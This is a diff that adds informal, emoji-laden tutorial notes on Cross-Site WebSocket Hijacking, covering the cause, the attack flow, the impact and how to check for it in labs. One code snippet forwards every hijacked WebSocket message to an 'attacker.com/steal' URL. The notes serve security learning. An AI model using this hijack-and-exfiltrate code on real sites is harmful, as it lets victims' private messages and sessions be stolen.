@@ -552,24 +552,186 @@ X-Role: admin
 
 
 ----
+----
+----
+----
+----
+----
+
+-----
+----
+----
+
+💣 What does CSWSH mean?
+==================
+
+
+The idea is simple:
+-----------------
+
+> Like CSRF... but more dangerous 😈
+
+- Attacker runs a malicious website
+- The victim enters him
+- The site has a WebSocket connection to the target
+- The server thinks that this is the victim (because of the cookies)
+
+💥 now :
+
+> You control the victim's WebSocket
+
+
+----
+
+⚔️ Why is this happening?
+================
+
+💡Main reason:
+-----------------
+
+The handshake depends only on:
+
+Cookie: session=XYZ
+
+❌ There is no:
+
+- CSRF token
+- Origin check is strong
+- validation
+
+-----
+
+
+😈 How does the attack happen?
+=====================
+
+1️⃣ The victim logged in
+--------------------
+
+(He has a session)
+
+* * * * *
+
+2️⃣ Enters your malicious site
+---------------------
+
+* * * * *
+
+3️⃣ You work:
+-------------
+
+```
+var ws = new WebSocket("wss://victim.com/chat");
+
+ws.onopen = () => {\
+    ws.send(JSON.stringify({\
+        action: "getMessages"\
+    }));\
+};
+
+ws.onmessage = (msg) => {\
+    fetch("https://attacker.com/steal?data=" + msg.data);\
+};
+```
+
+* * * * *
+
+💥 Result:
+-----------
+
+- The server sees the victim's session
+-   You:
+    - I sent commands 😈
+    - You read responses 😈
+
+
+----
 
 
 
+🔥 Difference from regular CSRF
+=======================
+
+| CSRF | CSWSH|
+| --- | --- |
+| one-way | two-way 💣 |
+| I just sent a request | sent + received |
+| limited | full interaction |
+
+* * * * *
+
+💣 impact (Why is it solid?)
+=========================
+
+You can:
+-----
+
+- 👤 Actions are taken in the name of the victim
+- 📩 You read private messages
+- 🔐 Extracts sensitive data
+- 💥 Account takeover in some cases
+
+* * * * *
+
+🎯 How do you discover it in the laps?
+=========================
+
+1️⃣ Look at handshake:
+---------------------
+
+If you find:
+
+```
+Cookie: session=...
+```
+
+❌And there is no:
+
+- CSRF token
+- custom header is strange
+- origin check
+
+👉 Mostly vulnerable
+
+* * * * *
+
+2️⃣ Try from an external site
+---------------------
+
+Make simple HTML:
+
+```
+<script>
+var ws = new WebSocket("wss://TARGET/chat");
+
+ws.onopen = () => {
+    ws.send(JSON.stringify({"message":"test"}));
+};
+
+ws.onmessage = (e) => {
+    console.log(e.data);
+};
+</script>
+```
+
+* * * * *
 
 
+😈 If it works:
+------------
 
+💥 Congratulations → CSWSH
 
+* * * * *
 
+🧠 A heavy point that you must understand
+=========================
 
+> 🔥 The browser sends cookies automatically with WebSocket
 
+even if:
 
-
-
-
-
-
-
-
+- The request comes from another domain 😈
 
 
 
